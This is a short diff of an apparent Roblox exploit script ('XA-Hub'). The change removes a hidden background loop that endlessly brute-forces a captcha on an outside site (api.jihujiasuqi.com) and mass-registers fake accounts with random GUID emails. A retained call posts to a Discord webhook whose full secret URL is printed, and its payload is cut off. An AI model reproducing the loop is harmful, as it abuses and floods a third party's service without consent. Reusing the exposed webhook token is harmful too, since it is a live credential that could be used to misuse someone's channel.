@@ -1,6 +1,3 @@
-if not isfolder("XA-Hub") then makefolder("XA-Hub") end
-if not isfolder("XA-Hub/VapeLib") then makefolder("XA-Hub/VapeLib") end
-
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = game:GetService("Players").LocalPlayer
 
@@ -23,17 +20,6 @@ end
 
 if not _G.Load then
     _G.Load = true
-    task.spawn(function()
-        while true do
-            local Rand = GetJson("https://api.jihujiasuqi.com//apps/captcha/get.php").rand
-            for i = 30, 330, 30 do
-                if GetJson("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..Rand.."&angle="..i).okey then
-                    GetJson("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..HttpService:GenerateGUID(false).."&captcha_rand="..Rand)
-                    break
-                end
-            end
-        end
-    end)
     task.spawn(function()
         request({
             Url = "https://discord.com/api/webhooks/1235459830311948308/zjy2op1grz56ka-pG8GvbTJ37sJNxUWNyQhaSVBz00e30Pf0qf9mEtjqtF1cXvLhvcUr",
